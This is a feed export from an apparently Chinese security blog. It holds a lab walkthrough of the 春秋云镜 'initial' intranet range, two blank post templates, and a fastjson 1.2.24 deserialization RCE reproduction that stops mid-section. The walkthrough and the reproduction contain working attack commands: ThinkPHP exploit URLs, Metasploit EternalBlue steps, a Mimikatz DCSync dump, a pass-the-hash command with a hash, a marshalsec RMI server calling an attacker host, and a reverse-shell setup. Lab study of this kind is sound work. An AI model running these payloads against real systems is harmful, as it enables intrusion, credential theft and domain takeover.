    <title>内网渗透--春秋云镜initial</title>
    <link href="/2025/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial/"/>
    <url>/2025/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial/</url>
    
    <content type="html"><![CDATA[<h1 id="内网渗透–春秋云镜initial"><a href="#内网渗透–春秋云镜initial" class="headerlink" title="内网渗透–春秋云镜initial"></a>内网渗透–春秋云镜initial</h1><h2 id="一，前置知识"><a href="#一，前置知识" class="headerlink" title="一，前置知识"></a>一，前置知识</h2><h3 id="前置知识包括三个部分thinkphp-内网穿透，永恒之蓝"><a href="#前置知识包括三个部分thinkphp-内网穿透，永恒之蓝" class="headerlink" title="前置知识包括三个部分thinkphp,内网穿透，永恒之蓝"></a>前置知识包括三个部分thinkphp,内网穿透，永恒之蓝</h3><h4 id="1-thinkphp漏洞原理"><a href="#1-thinkphp漏洞原理" class="headerlink" title="1.thinkphp漏洞原理"></a>1.thinkphp漏洞原理</h4><h5 id="thinkphp-2-x"><a href="#thinkphp-2-x" class="headerlink" title="thinkphp 2.x"></a>thinkphp 2.x</h5><p>ThinkPHP 2.x 远程代码执行漏洞（CVE-2014-9784）的原理主要涉及框架对用户输入的动态路由处理机制未进行严格过滤，导致攻击者可通过构造特定 URL 执行任意 PHP 代码</p><p>使用<code>preg_replace</code>的<code>/e</code>模式匹配路由：</p><p><code>$res = preg_replace(&#39;@(\w+)&#39;.$depr.&#39;([^&#39;.$depr.&#39;\/]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;, implode($depr,$paths));</code></p><p>导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。</p><p>例如执行的poc url:</p><p><code>http://ip:8080//index.php? s=/index/index/xxx/$&#123;system(id)&#125;</code></p><h5 id="ThinkPHP5-SQL注入漏洞-敏感信息泄露"><a href="#ThinkPHP5-SQL注入漏洞-敏感信息泄露" class="headerlink" title="ThinkPHP5 SQL注入漏洞 &amp;&amp; 敏感信息泄露"></a>ThinkPHP5 SQL注入漏洞 &amp;&amp; 敏感信息泄露</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">index</span>\<span class="hljs-title class_">controller</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">app</span>\<span class="hljs-title">index</span>\<span class="hljs-title">model</span>\<span class="hljs-title">User</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$ids</span> = <span class="hljs-title function_ invoke__">input</span>(<span class="hljs-string">&#x27;ids/a&#x27;</span>);<br>        <span class="hljs-variable">$t</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>        <span class="hljs-variable">$result</span> = <span class="hljs-variable">$t</span>-&gt;<span class="hljs-title function_ invoke__">where</span>(<span class="hljs-string">&#x27;id&#x27;</span>, <span class="hljs-string">&#x27;in&#x27;</span>, <span class="hljs-variable">$ids</span>)-&gt;<span class="hljs-title function_ invoke__">select</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>代码使用 <code>input(&#39;ids/a&#39;)</code> 来接收用户输入，此方式未对输入进行严格过滤与验证，攻击者可能会通过构造恶意输入实施 SQL 注入攻击。比如，攻击者可传入包含恶意 SQL 语句的 <code>ids</code> 参数，借此绕过正常的查询逻辑。</p><p>例如： <code>http://192.168.18.181/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1</code></p><p> 数组的键名（<code>0,updatexml(...)</code>）被直接拼接到 SQL 查询中，导致 SQL 注入。</p><p>即<code>SELECT * FROM user WHERE id IN (0,updatexml(0,concat(0xa,user()),0))</code></p><h5 id="ThinkPHP-5-0-23-远程代码执行漏洞"><a href="#ThinkPHP-5-0-23-远程代码执行漏洞" class="headerlink" title="ThinkPHP 5.0.23 远程代码执行漏洞"></a>ThinkPHP 5.0.23 远程代码执行漏洞</h5><p>其5.0.23以前的版本中，获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。</p><p>poc url:</p><p><code>http://example.com/index.php?s=captcha&amp;method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id</code></p><h4 id="2，内网穿透"><a href="#2，内网穿透" class="headerlink" title="2，内网穿透"></a>2，内网穿透</h4><h5 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h5><p>攻击外网服务器，获取外网服务器的权限，接着利用入侵成功的外网服务器作为跳板，攻击内网其他服务器，最后获得敏感数据，并将数据传递到攻击者，看情况安装长期后门，实现长期控制和获得敏感数据的方式</p><h5 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h5><p><strong>frp中转代理</strong></p><p><strong>服务端（frps）</strong>：部署在公网服务器，监听指定端口，负责接收外部请求并转发到内网。</p><p><strong>客户端（frpc）</strong>：运行在内网设备，与服务端建立长连接，将内网服务映射到公网。</p><p><strong>Neo-reGeorg</strong>脚本监听</p><p><strong>服务端</strong>：部署在目标服务器的 Webshell 脚本（如<code>tunnel.php</code>、<code>tunnel.jsp</code>），负责接收 HTTP 请求并转发到内网目标。</p><p><strong>客户端</strong>：攻击机上运行的 Python 脚本（如<code>reGeorgSocksProxy.py</code>），监听本地端口并将 SOCKS 请求通过 HTTP 协议发送到服务端。</p><h4 id="3-横向移动与域渗透"><a href="#3-横向移动与域渗透" class="headerlink" title="3.横向移动与域渗透"></a>3.横向移动与域渗透</h4><p><strong>横向移动</strong>：在内网中从已控制的主机向其他未授权主机扩展权限的过程，核心目标是获取更多资源访问权限。</p><p>通常采用哈希传递的方法是实现横向移动：</p><p>在 Windows 系统中，用户密码通常以哈希值的形式存储，而攻击者可以直接传递这个哈希值来完成认证，绕过传统的口令验证。</p><p>哈希传递（PTH）：使用<code>crackmapexec</code>结合 NTLM 哈希远程执行命令。</p><p><strong>域渗透</strong>：针对 Windows 域环境的攻击，目标是控制域控制器（DC）并获取域内所有资源权限。</p><p>域控攻击</p><ul><li><p><strong>DCSync 攻击</strong>：利用 Mimikatz 导出域内用户哈希。</p></li><li><p><strong>黄金票据（Golden Ticket）</strong>：伪造 Kerberos TGT 票据，长期控制域。</p></li></ul><h2 id="二，复现过程"><a href="#二，复现过程" class="headerlink" title="二，复现过程"></a>二，复现过程</h2><p>利用集成攻击工具然后getshell</p><p>连接蚁剑终端，查看权限</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-18%20205826.png" alt="蚁剑终端权限"></p><p>注意到&#x2F;usr&#x2F;bin&#x2F;mysql有root权限，我们可以采用mysql提权</p><p><code>sudo mysql -e &#39;\! cat /root/flag/f*&#39;</code></p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-18%20205817.png" alt="MySQL提权"></p><p>成功夺取flag01</p><p>随后进行信息收集，先用ifconfig查看内网IP</p><p><img src="https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/2023/08/5.png" alt="内网IP信息"></p><p>上传fscan_amd扫描内网环境</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-18%20210116.png" alt="扫描内网环境"></p><p>注意到内网中有三个ip:172.22.1.21存在永恒之蓝  172.22.1.18信呼系统  172.22.1.2   DC域控</p><p><strong>DC权限最高，在最后夺取域控的时候打，先打信呼</strong></p><h3 id="2，内网渗透"><a href="#2，内网渗透" class="headerlink" title="2，内网渗透"></a>2，内网渗透</h3><p>利用工具neo-regeorgs生成脚本并上传</p><p><code>python3 nenreg.py generate -k kali</code></p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-18%20210400.png" alt="生成脚本并上传"></p><p>设置socks5代理监听1080端口</p><p><code>python neoreg.py -k password -u http://39.98.171.149/tunnel.php</code></p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-18%20210643.png" alt="设置socks5代理"></p><p>在proxychains4设置socks5代理</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-18%20211858.png" alt="设置socks5代理"></p><p>测试连接</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-18%20212117.png" alt="测试连接"></p><p>连接成功</p><p>随后利用现成的poc打信呼，同时在同目录下放置一句话木马</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-18%20212946.png" alt="利用poc打信呼"></p><p>通过回显的url连接蚁剑夺取flag02</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-18%20213328.png" alt="夺取flag02"></p><h3 id="3-横向移动与域渗透-1"><a href="#3-横向移动与域渗透-1" class="headerlink" title="3.横向移动与域渗透"></a>3.横向移动与域渗透</h3><p>先打利用msf打永恒之蓝</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/windows/smb/ms17_010_eternalblue<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br>show options <br><span class="hljs-built_in">set</span> rhosts 172.22.1.21<br>run<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-18%20213439.png" alt="打永恒之蓝"></p><p>开始横向，导出域控hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">load kiwi<br>kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-18%20213654.png" alt="导出域控hash"></p><p>我们得到了最高权限密码</p><p>最后打hash传递</p><p><code>proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x &quot;type Users\Administrator\flag\flag03.txt&quot;</code></p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-18%20214129.png" alt="打hash传递"></p><p>用NTLM 哈希值以该用户身份登录系统，然后夺取整个域控，在主机中拿下flag</p>]]></content>
    
    
    <categories>
      
      <category>Web渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网渗透</tag>
      
      <tag>域渗透</tag>
      
      <tag>横向移动</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF题目解析：【题目名称】</title>
    <link href="/2023/10/18/CTF%E7%AB%9E%E8%B5%9B%E6%A8%A1%E6%9D%BF/"/>
    <url>/2023/10/18/CTF%E7%AB%9E%E8%B5%9B%E6%A8%A1%E6%9D%BF/</url>
    
    <content type="html"><![CDATA[<h2 id="🚩-题目信息"><a href="#🚩-题目信息" class="headerlink" title="🚩 题目信息"></a>🚩 题目信息</h2><table><thead><tr><th>项目</th><th>详情</th></tr></thead><tbody><tr><td>比赛名称</td><td>XXXX CTF 2023</td></tr><tr><td>题目类型</td><td>Web&#x2F;Crypto&#x2F;Pwn&#x2F;Reverse&#x2F;Misc</td></tr><tr><td>难度级别</td><td>简单&#x2F;中等&#x2F;困难</td></tr><tr><td>分值</td><td>XXX</td></tr></tbody></table><span id="more"></span><h2 id="📝-题目描述"><a href="#📝-题目描述" class="headerlink" title="📝 题目描述"></a>📝 题目描述</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">这里是原始题目描述<br></code></pre></td></tr></table></figure><h3 id="题目附件"><a href="#题目附件" class="headerlink" title="题目附件"></a>题目附件</h3><ul><li>附件1：<a href="">下载链接</a></li><li>附件2：<a href="">下载链接</a></li></ul><h2 id="🔍-解题思路"><a href="#🔍-解题思路" class="headerlink" title="🔍 解题思路"></a>🔍 解题思路</h2><h3 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h3><p>描述看到题目后的初步分析和思路。</p><h3 id="关键突破点"><a href="#关键突破点" class="headerlink" title="关键突破点"></a>关键突破点</h3><p>分析解题的关键点和突破口。</p><h3 id="解题路径"><a href="#解题路径" class="headerlink" title="解题路径"></a>解题路径</h3><p>详细描述从题目到获取flag的完整思路。</p><h2 id="💻-解题过程"><a href="#💻-解题过程" class="headerlink" title="💻 解题过程"></a>💻 解题过程</h2><h3 id="第一步：信息收集"><a href="#第一步：信息收集" class="headerlink" title="第一步：信息收集"></a>第一步：信息收集</h3><p>详细说明第一步的操作和发现。</p><h3 id="第二步：漏洞分析"><a href="#第二步：漏洞分析" class="headerlink" title="第二步：漏洞分析"></a>第二步：漏洞分析</h3><p>分析题目中的漏洞或切入点。</p><h3 id="第三步：漏洞利用"><a href="#第三步：漏洞利用" class="headerlink" title="第三步：漏洞利用"></a>第三步：漏洞利用</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 解题代码</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve_challenge</span>():<br>    <span class="hljs-comment"># 代码实现</span><br>    flag = <span class="hljs-string">&quot;获取flag的过程&quot;</span><br>    <span class="hljs-keyword">return</span> flag<br><br><span class="hljs-built_in">print</span>(solve_challenge())<br></code></pre></td></tr></table></figure><h3 id="第四步：获取Flag"><a href="#第四步：获取Flag" class="headerlink" title="第四步：获取Flag"></a>第四步：获取Flag</h3><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">flag&#123;<span class="hljs-keyword">this</span><span class="hljs-number">_</span><span class="hljs-keyword">is</span><span class="hljs-number">_</span>a<span class="hljs-number">_</span>sample<span class="hljs-number">_f</span>lag&#125;<br></code></pre></td></tr></table></figure><h2 id="📚-相关知识点"><a href="#📚-相关知识点" class="headerlink" title="📚 相关知识点"></a>📚 相关知识点</h2><h3 id="知识点1"><a href="#知识点1" class="headerlink" title="知识点1"></a>知识点1</h3><p>详细解释解题过程中涉及的第一个知识点。</p><h3 id="知识点2"><a href="#知识点2" class="headerlink" title="知识点2"></a>知识点2</h3><p>详细解释解题过程中涉及的第二个知识点。</p><h3 id="知识点3"><a href="#知识点3" class="headerlink" title="知识点3"></a>知识点3</h3><p>详细解释解题过程中涉及的第三个知识点。</p><h2 id="🔧-工具使用"><a href="#🔧-工具使用" class="headerlink" title="🔧 工具使用"></a>🔧 工具使用</h2><ul><li>工具1：用途及使用方法</li><li>工具2：用途及使用方法</li></ul><h2 id="💡-解题心得"><a href="#💡-解题心得" class="headerlink" title="💡 解题心得"></a>💡 解题心得</h2><p>分享解题过程中的心得体会、遇到的困难和解决方法。</p><h2 id="📌-相关题目推荐"><a href="#📌-相关题目推荐" class="headerlink" title="📌 相关题目推荐"></a>📌 相关题目推荐</h2><ul><li>相关题目1：简要描述</li><li>相关题目2：简要描述</li></ul><h2 id="🏆-总结"><a href="#🏆-总结" class="headerlink" title="🏆 总结"></a>🏆 总结</h2><p>总结这道题的价值和学习到的技能。</p>]]></content>
    
    
    <categories>
      
      <category>CTF竞赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WriteUp</tag>
      
      <tag>解题思路</tag>
      
      <tag>技能提升</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web渗透技术：【技术名称】</title>
    <link href="/2023/10/18/Web%E6%B8%97%E9%80%8F%E6%A8%A1%E6%9D%BF/"/>
    <url>/2023/10/18/Web%E6%B8%97%E9%80%8F%E6%A8%A1%E6%9D%BF/</url>
    
    <content type="html"><![CDATA[<h2 id="📝-技术概述"><a href="#📝-技术概述" class="headerlink" title="📝 技术概述"></a>📝 技术概述</h2><p>这里简要介绍该Web渗透技术的基本概念和应用场景。</p><span id="more"></span><h2 id="🔍-技术原理"><a href="#🔍-技术原理" class="headerlink" title="🔍 技术原理"></a>🔍 技术原理</h2><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>详细解释该渗透技术的工作原理和技术基础。</p><h3 id="攻击链分析"><a href="#攻击链分析" class="headerlink" title="攻击链分析"></a>攻击链分析</h3><p>分析该技术在整个攻击链中的位置和作用。</p><h2 id="💻-实战演示"><a href="#💻-实战演示" class="headerlink" title="💻 实战演示"></a>💻 实战演示</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><ul><li>测试环境搭建</li><li>所需工具</li><li>前置条件</li></ul><h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><ol><li>第一步：信息收集</li><li>第二步：漏洞识别</li><li>第三步：漏洞利用</li><li>第四步：权限提升</li><li>第五步：后渗透操作</li></ol><h3 id="关键代码"><a href="#关键代码" class="headerlink" title="关键代码"></a>关键代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 攻击示例代码</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">web_penetration</span>():<br>    target = <span class="hljs-string">&quot;http://example.com&quot;</span><br>    <span class="hljs-comment"># 执行渗透测试步骤</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;开始渗透测试...&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="🛡️-防御措施"><a href="#🛡️-防御措施" class="headerlink" title="🛡️ 防御措施"></a>🛡️ 防御措施</h2><h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><p>如何检测此类攻击的发生。</p><h3 id="防御策略"><a href="#防御策略" class="headerlink" title="防御策略"></a>防御策略</h3><ul><li>技术层面防御</li><li>管理层面防御</li><li>应急响应建议</li></ul><h2 id="📊-实际案例"><a href="#📊-实际案例" class="headerlink" title="📊 实际案例"></a>📊 实际案例</h2><table><thead><tr><th>案例</th><th>时间</th><th>影响</th><th>技术特点</th></tr></thead><tbody><tr><td>案例1</td><td>2023年</td><td>严重</td><td>特点描述</td></tr><tr><td>案例2</td><td>2022年</td><td>中等</td><td>特点描述</td></tr></tbody></table><h2 id="🔧-工具推荐"><a href="#🔧-工具推荐" class="headerlink" title="🔧 工具推荐"></a>🔧 工具推荐</h2><ul><li>工具1：<a href="https://example.com/">工具链接</a> - 简要描述</li><li>工具2：<a href="https://example.com/">工具链接</a> - 简要描述</li></ul><h2 id="📚-参考资料"><a href="#📚-参考资料" class="headerlink" title="📚 参考资料"></a>📚 参考资料</h2><ul><li><a href="https://example.com/">参考链接1</a></li><li><a href="https://example.com/">参考链接2</a></li></ul><h2 id="💡-总结与思考"><a href="#💡-总结与思考" class="headerlink" title="💡 总结与思考"></a>💡 总结与思考</h2><p>对该渗透技术的总结评价和未来发展趋势的思考。</p>]]></content>
    
    
    <categories>
      
      <category>Web渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>攻击技术</tag>
      
      <tag>Web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fastjson 1.2.24 反序列化 RCE 漏洞复现(CVE-2017-18349)</title>
    <link href="/2023/10/18/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/10/18/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="📢-漏洞概述"><a href="#📢-漏洞概述" class="headerlink" title="📢 漏洞概述"></a>📢 漏洞概述</h2><h4 id="漏洞背景："><a href="#漏洞背景：" class="headerlink" title="漏洞背景："></a>漏洞背景：</h4><p>1.fastjson 是阿里巴巴开发的一款高性能 JSON 解析库，在 Java 开发领域被广泛应用，用于处理 JSON 数据的序列化与反序列化操作，众多企业级应用借助它实现高效的数据交互与处理。</p><p>2.Java 反序列化机制是 Java 提供的一种将字节流重新转换为 Java 对象的功能，在分布式系统、远程通信等场景中常用，但该机制存在被恶意利用的风险。</p><p>3.当 fastjson 在反序列化过程中对输入数据的校验和控制不足时，攻击者可构造特殊的 JSON 数据，利用 Java 反序列化机制执行任意代码，从而严重威胁应用系统安全。</p><h4 id="漏洞触发条件："><a href="#漏洞触发条件：" class="headerlink" title="漏洞触发条件："></a><em>漏洞触发条件：</em></h4><p>1.fastjson 的 autoType 功能默认开启，该功能允许在反序列化时根据 JSON 数据中的 @type 字段来确定要反序列化的具体 Java 类。此功能虽提供了便利，但也为攻击者创造了可乘之机。</p><p>2.攻击者构造包含特定恶意类（如具有 JNDI 注入能力的类）的 JSON 数据，利用 autoType 功能，使 fastjson 在反序列化过程中加载并实例化恶意类，进而触发远程代码执行漏洞。</p><h4 id="漏洞利用流程："><a href="#漏洞利用流程：" class="headerlink" title="漏洞利用流程："></a>漏洞利用流程：</h4><p>1.攻击者需要找到应用程序中使用 fastjson 进行 JSON 反序列化的接口端点，例如常见的接受 JSON 格式数据的 API 接口。</p><p>2.在 CVE - 2017 - 18349 漏洞利用中，攻击者利用 fastjson 对 @type 字段的解析特性，精心构造恶意 JSON 数据。</p><p>3.恶意类加载与执行：攻击者构造的 JSON 数据中指定的恶意类（如 com.sun.rowset.JdbcRowSetImpl）在反序列化过程中被加载，该类在初始化时会解析特定参数（如 dataSourceName），攻击者通过将该参数指向恶意的 LDAP 服务器，触发 JNDI 注入，最终实现远程代码执行。</p><p><img src="/%5Cimg%5Cwps1-1755424575710-1-1755424618927-3.jpg" alt="img"> </p><h2 id="🔎-漏洞详情"><a href="#🔎-漏洞详情" class="headerlink" title="🔎 漏洞详情"></a>🔎 漏洞详情</h2><h4 id="受影响的版本："><a href="#受影响的版本：" class="headerlink" title="受影响的版本："></a>受影响的版本：</h4><p>此漏洞影响 fastjson 1.2.24 及以下版本。只要应用中使用了这些版本的 fastjson 库进行 JSON 反序列化操作，并且 autoType 功能未被正确禁用，漏洞就可能被触发。<br>配置和部署条件：<br>仅在 fastjson 库的 autoType 功能开启，且应用未对反序列化类进行严格白名单限制的情况下，攻击者才能利用该漏洞。默认情况下，fastjson 的 autoType 功能是开启的，许多开发者在项目开发过程中如果没有关注到安全配置，就容易引入安全隐患。</p><h4 id="可能受影响的系统："><a href="#可能受影响的系统：" class="headerlink" title="可能受影响的系统："></a>可能受影响的系统：</h4><p>Java Web 应用： 广泛使用 fastjson 处理 JSON 数据交互的各类 Java Web 应用，包括电商平台、企业管理系统、在线办公系统等。<br>分布式系统： 以 Java 语言开发，采用分布式架构，在各节点间使用 fastjson 进行数据传输与解析的分布式系统。<br>微服务架构： 基于微服务架构搭建，服务间通信依赖 fastjson 进行 JSON 数据序列化与反序列化的应用体系。</p><h4 id="潜在风险与后果："><a href="#潜在风险与后果：" class="headerlink" title="潜在风险与后果："></a>潜在风险与后果：</h4><p>漏洞可导致远程代码执行，攻击者能够在受影响的服务器上执行任意 Java 代码，进而获取服务器敏感信息，如数据库连接信息、用户凭证等。<br>如果受影响的应用系统缺乏有效的边界防护与访问控制，攻击者可借助该漏洞实现横向移动，进一步渗透整个网络，造成大规模的数据泄露、服务瘫痪，甚至使企业关键业务系统完全被攻击者掌控 。</p><h4 id="评分"><a href="#评分" class="headerlink" title="评分"></a>评分</h4><p>CVE-2017-18349 漏洞的 CVSS v3.0 评分为 8.1，同样属于高风险漏洞。鉴于其能引发远程代码执行，一旦被利用，攻击者可肆意操控服务器，窃取敏感数据、破坏系统运行。尤其是当使用 fastjson 1.2.24 及以下版本的系统暴露在公共网络上时，遭受攻击的风险急剧攀升。强烈建议相关企业与开发者尽快按照修复建议进行处理，如升级 fastjson 至安全版本，或合理配置 autoType 关闭策略，降低安全隐患，保障系统平稳、安全运行 。</p><h3 id="漏洞存在条件"><a href="#漏洞存在条件" class="headerlink" title="漏洞存在条件"></a>漏洞存在条件</h3><p>fastjson 的 autoType 功能开启：fastjson 必须开启了 autoType 功能，默认情况下 fastjson 1.2.24 及以下版本该功能是开启的。当应用程序使用 fastjson 进行 JSON 反序列化时，这个功能允许根据 JSON 数据中的 @type 字段来确定要反序列化的具体 Java 类，从而为漏洞利用创造了条件。</p><p>反序列化类未受严格限制：应用程序在使用 fastjson 进行反序列化操作时，没有对反序列化的类进行严格的白名单限制。这使得攻击者能够构造包含恶意类（如具有 JNDI 注入能力的类，如 com.sun.rowset.JdbcRowSetImpl 等）的 JSON 数据，在反序列化过程中加载并实例化这些恶意类。</p><p>使用的 fastjson 版本：漏洞存在于 fastjson 1.2.24 及以下版本中。如果应用程序没有及时将 fastjson 库升级到安全版本（1.2.25 及以上），就容易受到该反序列化 RCE 漏洞的影响。</p><h2 id="🧪-漏洞复现"><a href="#🧪-漏洞复现" class="headerlink" title="🧪 漏洞复现"></a>🧪 漏洞复现</h2><h6 id="1-拉取CVE-2019-17558复现环境"><a href="#1-拉取CVE-2019-17558复现环境" class="headerlink" title="1.拉取CVE-2019-17558复现环境"></a>1.拉取CVE-2019-17558复现环境</h6><p>在靶机对应的漏洞文件夹下运行docker compose up</p><p>运行docker ps可查看容器运行情况</p><p><img src="/img/wps2.jpg" alt="img"> </p><p>由图可知，容器成功运行在本机8090端口</p><p><strong>2.编译反弹shell代码</strong></p><p>在本地写一个test.java</p><p><img src="/img/wps3.jpg" alt="img"> </p><p>将shell反弹到本机4563端口</p><p>在Java8环境中编译test.java并上传到服务器</p><p><img src="/img/wps4.jpg" alt="img"> </p><p>随后开启http服务，将爆破代码上传****pyton -m http.server 5623****</p><p><img src="/img/wps5.jpg" alt="img"> </p><p>访问端口发现其成功运行</p><p><img src="/img/wps6.jpg" alt="img"> </p><p><strong>3.部署rmi服务</strong></p><p>在github上获取****marshalsec-0.0.3–SHOT-all.jar****</p><p>链接为<a href="https://github.com/RandomRobbieBF/marshalsec-jar">https://github.com/RandomRobbieBF/marshalsec-jar</a></p><p>运行以下命令</p><p>java -cp marshalsec-0.0.3–SHOT-all.jar marshalsec.jndi.RMIRefServer “<a href="http://47.96.99.165:5623/#test">http://47.96.99。165:5623/#test</a>“ 8653</p><p><img src="/img/wps7.jpg" alt="img"> </p><ol start="4"><li><strong>构造playload进行攻击</strong></li></ol><p><img src="/img/wps8.jpg" alt="img"> </p><p>观察端口回显</p><p><img src="/img/wps9.jpg" alt="img"> </p><p>发现5623端口目录被访问</p><p><img src="/img/wps10.jpg" alt="img"> </p><p>8653端口的rmi服务启动并被执行</p><p><img src="/img/wps11.jpg" alt="img"> </p><p>监听的4563端口成功反弹shell</p><h3 id="数据分析"><a href="#数据分析" class="headerlink" title="数据分析"></a>数据分析</h3><p>流量分析</p><p><img src="/img/image-20250817175049808.png" alt="image-20250817175049808"></p><h6 id="特殊的-JSON-数据格式："><a href="#特殊的-JSON-数据格式：" class="headerlink" title="特殊的 JSON 数据格式："></a>特殊的 JSON 数据格式：</h6><p>流量包中会包含精心构造的 JSON 数据，这些数据通常包含 @type 字段，用于指定要反序列化的类。例如：”@type”:”com.sun.rowset.JdbcRowSetImpl”,<br>          “dataSourceName”:”rmi:&#x2F;&#x2F;192.168.0.1:8653&#x2F;test”,<br>          “autoCommit”:true</p><h6 id="JNDI-相关的请求："><a href="#JNDI-相关的请求：" class="headerlink" title="JNDI 相关的请求："></a>JNDI 相关的请求：</h6><p>由于漏洞利用常借助 JNDI（Java 命名和目录接口）注入来实现远程代码执行，流量包中会出现与 JNDI 相关的请求。比如，会有向恶意 LDAP 服务器（如数据中 dataSourceName 指定的地址）发起的请求，以获取恶意类或资源。这些请求的目标地址通常是攻击者控制的服务器，并且请求的协议为 LDAP 协议（端口一般为 389 或攻击者自定义的端口，如 1389 等）。</p><h6 id="异常的请求头和内容类型："><a href="#异常的请求头和内容类型：" class="headerlink" title="异常的请求头和内容类型："></a>异常的请求头和内容类型：</h6><p>一般来说，使用 fastjson 进行数据交互的请求会有特定的请求头，比如 Content-Type: application&#x2F;json。但在攻击过程中，除了正常的 JSON 数据传输特征外，由于恶意构造的存在，请求的内容可能会包含一些不常见或不符合正常业务逻辑的字段和值。</p><h6 id="频繁的请求模式："><a href="#频繁的请求模式：" class="headerlink" 